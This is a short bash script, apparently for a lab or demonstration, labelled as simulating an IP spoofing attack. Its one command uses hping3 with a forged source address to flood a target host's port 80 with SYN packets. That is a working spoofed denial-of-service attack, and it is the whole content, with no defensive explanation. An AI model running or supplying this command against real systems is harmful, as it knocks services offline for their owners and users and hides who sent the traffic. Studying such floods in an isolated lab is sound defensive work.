#!/bin/bash
echo "Simulating IP Spoofing Attack..."
sudo hping3 -a 192.168.1.10 -S 192.168.1.1 -p 80 --flood
